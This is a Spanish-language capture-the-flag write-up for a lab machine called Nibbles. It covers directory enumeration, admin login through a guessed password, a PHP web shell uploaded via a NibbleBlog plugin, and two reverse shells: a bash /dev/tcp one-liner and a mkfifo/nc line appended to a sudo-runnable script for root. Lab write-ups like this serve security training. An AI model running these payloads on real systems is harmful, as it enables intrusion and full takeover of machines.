---

---
----
- Tags: #CTF #LFI #ReverseShell
----
### 1. Enumeración

La máquina tiene los puertos 22 (ssh) y 80 (http) abiertos:

![[Nibbles_1.png|500]]

Si analizamos ahora con `-sCV` estos puertos, descubrimos que, por un lado, en el puerto 22 se está utilizando la versión 7.2p2 de OpenSSH, y en el puerto 80, se está usando Apache 2.4.18 para el servidor. Pasando a la parte de **Foot Printing**, abrimos Firefox y navegamos a la página principal, donde solo vemos una página vacía con un mensaje. Si inspeccionamos el código fuente, vemos un comentario interesante:

![[Nibbles_2.png|500]]

Podemos navegar a dicha ruta y ver que es una especie de blog. Usamos `whatweb` con dicha url para ver más información. También podemos usar Wappalyzer para comprobar qué tecnologías se están utilizando en este blog, y descubirmos que se está usando PHP, jQuery v2.1.0 y HTML5. Antes de pasar con la enumeración de directorios, vale la pena buscar exploits públicos para este blog. Simplemente usamos `searchsploit nibbleblog` y comprobamos que existen 2 exploits públicos, uno para múltiples inyecciones SQL y otro para subida de archivos arbitraria, pero usando Metasploit. Sin embargo, desconocemos la versión de NibbleBlog que se está utilizando, aunque ya sabemos que puede ser vulnerable. 
##### Enumeración de directorios con gobuster

Usaremos la herramienta de gobuster para enumerar por fuerza bruta directorios existentes. En este caso, vamos a hacerlo a partir de la ruta /nibbleblog. Usamos gobuster de la siguiente manera:

```bash
gobuster dir -u http://10.129.39.157/nibbleblog/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
```

Vemos resultados a nivel de directorio interesantes:

![[Nibbles_3.png|700]]

Hemos mencionado antes que desconocemos la versión de NibbleBlog que se está utilizando. Sin embargo, sabiendo que existe un README accesible mediante la URL, le echamos un vistazo y comprobamos que se muestra la versión de NibbleBlog, en este caso, **4.0.3**. Coincide con la versión que el exploit de subida de archivos puede explotar encontrado previamente con searchsploit. Podemos reutilizar el comando de gobuster que acabamos de usar, pero esta vez, añadiendo al final `-x php` para enumerar archivos con extensión `.php`. Si hacemos esto, descubrimos que existe `admin.php` como archivo interesante, que nos lleva al panel de administración. No tenemos las credenciales, pero vale la pena probar con root:root, admin:admin, aunque no funcionan.

Seguimos buscando en las carpetas que ha enumerado gobuster, y vamos a la ruta `/content`. En ella, vemos más carpetas interesantes, como la de private, que tiene un `users.xml`. Si accedemos, vemos el siguiente contenido:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
	<user username="admin">
		<id type="integer">0</id>
		<session_fail_count type="integer">1</session_fail_count>
		<session_date type="integer">1743290772</session_date>
	</user>
	<blacklist type="string" ip="10.10.10.1">
		<date type="integer">1512964659</date>
		<fail_count type="integer">1</fail_count>
	</blacklist>
	<blacklist type="string" ip="10.10.15.240">
		<date type="integer">1743290772</date>
		<fail_count type="integer">1</fail_count>
	</blacklist>
</users>
```

Sabemos que el usuario admin es válido, pero desconocemos su contraseña. Además, vemos con `<blacklist>` que si intentamos iniciar sesión erroneamente muchas veces nos banean la IP, por lo que el acceso por fuerza bruta en el panel lo descartamos. Podemos navegar al archivo `config.xml` para continuar obteniendo información. Vemos que la palabra _nibbles_ se menciona en dos ocasiones, siendo además el dominio del mail del blog. Podemos intentar iniciar sesión como admin con dicha contraseña, y tras intentarlo, vemos que, efectivamente, podemos iniciar sesión. 
### 2. Explotación

![[Nibbles_4.png|550]]

Dando una vuelta por la web, podemos ver el siguiente contenido:

| Página         | Contenido                                                                                                                                                                       |
|----------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Publicar       | Permite crear un nuevo post, post de video, post de cita o nueva página. Podría ser interesante.                                                                                |
| Comentarios    | Muestra que no hay comentarios publicados.                                                                                                                                     |
| Gestionar      | Permite gestionar posts, páginas y categorías. Podemos editar y eliminar categorías, aunque no resulta muy interesante.                                                           |
| Configuración  | Al desplazarse hasta el final se confirma que se está utilizando la versión vulnerable 4.0.3. Hay varios ajustes disponibles, pero ninguno parece valioso para nosotros.      |
| Temas          | Permite instalar un nuevo tema a partir de una lista preseleccionada.                                                                                                           |
| Plugins        | Permite configurar, instalar o desinstalar plugins. El plugin "My image" permite subir un archivo de imagen. ¿Podría abusarse de esto para subir código PHP, potencialmente?  |
Dentro de Publicar, podemos subir comentarios. Hacemos una pequeña prueba para comprobar si la página es vulnerable a ataques XSS persistentes, pero vemos que no. Vamos al directorio de plugins, ya que hay uno que permite subir una fotografía y podríamos incluir un PHP nuestro. 

```php
<?php
  system($_GET['cmd']);
?>
```

Lo intentamos subir, y aunque de primeras vemos muchos errores, parece ser que el archivo se ha subido correctamente. Ahora debemos buscar dónde está subido. Pensemos que se ha almacenado en la carpeta `/content`, que se descubrió en la fase de reconocimiento con gobuster. 

![[Nibbles_5.png]]

Efectivamente, hemos incluido un php malicioso, y la web lo interpreta. Vamos a establecer ahora una reverse shell para ganar acceso al sistema como usuario, con el one-liner web común:

```bash
bash -c "bash -i >%26 /dev/tcp/10.10.15.240/443 0>%261"
```

Antes de mandarlo, nos ponemos en escucha en un terminal con `nc -nvlp 443`. Mandamos el comando y hemos conseguido acceso mediante la reverse shell. 

![[Nibbles_6.png|600]]

Navegamos a la ruta `/home/nibbler` y obtenemos la flag del usuario (user.txt).

### 3. Escalada de privilegios

Ya hemos ganado acceso como usuario al sistema, pero ahora necesitamos escalar privilegios hasta conseguir ser root. Previamente, al hacer un `ls` sobre la ruta home del usuario, hemos visto un archivo zip. Vamos a descomprimirlo y ver qué contiene. 

```shell-session
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh 
```

Ahora, vamos a usar el comando `sudo -l` para comprobar qué archivos podemos ejecutar sin contraseña de root, y vemos que podemos ejecutar el script `monitor.sh` sin problemas. Entonces, aquí podemos añadir a este script lo que queramos, como `su -`, `bash -p`... Pero obtamos por una reverse shell para añadir algo más de complejidad:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.240 8443 >/tmp/f' | tee -a monitor.sh
```

Nos ponemos en escucha por dicho puerto en otra terminal. Ejecutamos `sudo ./monitor.sh` y vemos que ya somos root en la terminal que teníamos en escucha.


![[Nibbles_7.png|600]]

Obtenemos la flag de root y ya estaría. Máquina pwneada. Muy buenos.
























